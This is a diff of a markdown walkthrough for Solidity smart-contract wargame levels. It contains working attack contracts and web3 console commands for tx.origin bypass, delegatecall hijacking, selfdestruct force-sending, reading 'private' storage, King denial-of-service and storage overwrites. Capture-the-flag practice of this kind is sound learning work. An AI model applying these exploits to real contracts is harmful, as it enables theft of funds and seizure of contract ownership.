@@ -94,13 +94,15 @@ contract CoinFlipAttack {
 }
 ```
 
-deploy with params:<br>
-- address: contract.address get on console window
+Deploy `CoinFlipAttack.sol` with params:<br>
+- address: `contract.address` get on console window
 
-click button flip least 10 times
+Click button flip least 10 times
 
 console:
-`await contract.consecutiveWinds()` <br>
+
+`await contract.consecutiveWins()` <br>
+
 check `words` property is `[10, anything_there]`
 
 ===> submit level
@@ -111,14 +113,14 @@ Telephone.sol ==> create and copy content of this level.<br>
 TelephoneAttack.sol
 ```
 pragma solidity ^0.6.0;
-import './Wallet.sol';
+import './Telephone.sol';
 
 contract TelephoneAttack {
 
     Telephone w;
     
-    constructor(address _wallet) public {
-        w = Telephone(_wallet);
+    constructor(address t) public {
+        w = Telephone(t);
     }
 
     function attack(address _a) public {
@@ -127,10 +129,10 @@ contract TelephoneAttack {
 }
 ```
 
-deploy with params:<br>
-- address: contract.address get on console window
+Deploy with params:<br>
+- address: `contract.address` get on console window
 
-hackContract with param is your address
+click attack with param is your address
 <br>
 check `contract.address` will be your address
 
@@ -138,161 +140,181 @@ check `contract.address` will be your address
 
 ### Token
 console
-`contract.transfer('any_address', 20 + 1);`
+```
+//any_address but don't use player address
+contract.transfer('<any_address>', 20 + 1);
+```
 
 
 ### Delegation
-console
-`let pwn = web3.utils.sha3("pwn()");`
-`contract.sendTransaction({data: pwn})`
+console<br>
+```
+contract.sendTransaction({data: web3.utils.sha3("pwn()")})
+```
 
+===> Submit level
 
 ### Force
 ForceAttack.sol
-`
-    pragma solidity ^0.4.0;
+```
+pragma solidity ^0.4.26;
 
-    contract ForceAttack {
-        constructor() public payable{
-        }
-
-        function attack(address _a) public {
-            selfdestruct(_a);
-        }
+contract ForceAttack {
+    constructor() public payable{
     }
-`
 
-===>deploy with value 1 wei
-===>execute attack button with contract.address on console window
+    function attack(address _a) public {
+        selfdestruct(_a);
+    }
+}
+```
+Deploy `ForceAttack.sol` with params:<br>
+- value: 1 wei
+
+Execute attack button with `contract.address` on console window
+
+===> Submit level
+
 
 ### Vault
 console
-`let pwd;`
-`web3.eth.getStorageAt(contract.address, 1, (e,r)=>{pwd=r;})`
-`web3.utils.toAscii(pwd)`
-`contract.unlock(pwd)`
-`await contract.locked` ==> should be false
-
+```
+let pwd;
+await web3.eth.getStorageAt(contract.address, 1, (e,r)=>{pwd=r;})
+await web3.utils.toAscii(pwd)
+contract.unlock(pwd)
+await contract.locked()
+```
+===> Submit level
 
 ### King
 AttackKing.sol
-`
-    pragma solidity ^0.4.26;
+```
+pragma solidity ^0.4.26;
 
-    contract AttackKing {
-        constructor(address a) public payable{
-            address(a).call.value(msg.value)();
-        }
-
-        function() external payable{
-            revert('You lose!');
-        }
+contract AttackKing {
+    constructor(address a) public payable{
+        address(a).call.value(msg.value)();
     }
-`
 
-==>deploy with contract.address, value 1 ether
+    function() external payable{
+        revert('You lose!');
+    }
+}
+```
 
-`await contract._king()`
+Deploy with params:<br>
+- address: `contract.address` get on console window
+- value: 1 ether
+
+===> Submit level
 
 ### Elevator
+Elevator.sol ==> create and copy content of this level.<br>
 ElevatorAttack.sol
-`
-    pragma solidity ^0.5.0;
+```
+pragma solidity ^0.6.0;
+import './Elevator.sol';
 
-    contract ElevatorAttack {
-        bool public toggle = true;
-        Elevator public target;
+contract ElevatorAttack {
+    bool public toggle = true;
+    Elevator public target;
 
-        constructor(address a) public payable{
-            target = Elevator(a);
-        }
-
-        function isLastFloor(uint) public returns(bool) {
-            toggle = !toggle;
-            return toggle;
-        }
-
-        function setTop(uint _f) public {
-            target.goTo(_f);
-        }
+    constructor(address a) public payable{
+        target = Elevator(a);
     }
-`
-===> deploy with contract.address
-===> setTop with param is 15
-console 
-`await contract.floor()`
-`await contract.top()`
 
+    function isLastFloor(uint) public returns(bool) {
+        toggle = !toggle;
+        return toggle;
+    }
+
+    function setTop(uint _f) public {
+        target.goTo(_f);
+    }
+}
+```
+
+Deploy with params:<br>
+- address: `contract.address` get on console window
+
+click button setTop with param is 15
+
+===> submit level
 
 ### Gatekeeper Two
 GatekeeperTwoAttack.sol
-`
-    pragma solidity ^0.6.0;
+```
+pragma solidity ^0.6.0;
 
-    contract GatekeeperTwoAttack {
-        constructor(address a) public {
-            bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
-            a.call(abi.encodeWithSignature('enter(bytes8)', _key))
-        }
+contract GatekeeperTwoAttack {
+    constructor(address a) public {
+        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
+        a.call(abi.encodeWithSignature('enter(bytes8)', _key));
     }
-`
-===> deploy with contract.address
+}
+```
+
+Deploy with params:<br>
+- address: `contract.address` get on console window
+
+===> submit level
 
 ### Naught Coin
-console:
-`let a = (await contract.balanceOf(player)).toString();`
-`await contract.approve(player, a)`
-`(await contract.allowance(player, player)).toString()`
-`await contract.transferFrom(player, "any_address", a)`
-`(await contract.balanceOf(player)).toString()` 
+console:<br>
+```
+let a = (await contract.balanceOf(player)).toString();
+await contract.approve(player, a);
+(await contract.allowance(player, player)).toString();
+//any_address do not use player address
+await contract.transferFrom(player, "<any_address>", a)
+(await contract.balanceOf(player)).toString()
+``` 
 ==> 0
 
 ### Preservation
 PreservationAttack.sol
-`
-    pragma solidity ^0.5.0;
+```
+pragma solidity ^0.6.0;
 
-    contract PreservationAttack {
-        address a;
-        address b;
-        address public o;
-        uint time;
+contract PreservationAttack {
+    address a;
+    address b;
+    address public o;
+    uint time;
 
-        function setTime(uint t) public {
-            o = msg.sender;
-        }
+    function setTime(uint t) public {
+        o = msg.sender;
     }
-`
-===> deploy
+}
+```
+Deploy
+
+Copy address:<br>
+![img](./img/preservation.png)
+
 console:
-`
-    let sData = [];
-    for(i=0;i<6;i++) {
-        web3.eth.getStorageAt(contract.address, i, (e,cData) => {
-            sData[i] = cData
-        })
-    }
-`
-`await contract.setFirstTime("address_get")`
-address_get will get in remix idle after deployed
-`await contract.setFirstTime("12345")`
+```
+await contract.setFirstTime("address_copied")
+await contract.setFirstTime("12345")
+```
+===> submit level
 
 ### Recovery
 console
-`
-    data = web3.eth.abi.encodeFunctionCall({
-        name: 'destroy',
-        type: 'function',
-        inputs: [{
-            type: 'address',
-            name: '_to'
-        }]
-    },[player]);
-`
-`
-    await web3.eth.sendTransaction({
-        to: "your_address",
-        from: "player",
-        data: data
-    })
-`
+```
+let data = await web3.eth.abi.encodeFunctionCall({
+    name: 'destroy',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: '_to'
+    }]
+},[player]);
+await web3.eth.sendTransaction({
+    to: "<your_contract_address_loss_key>",
+    from: player,
+    data: data
+})
+```
+===> submit level
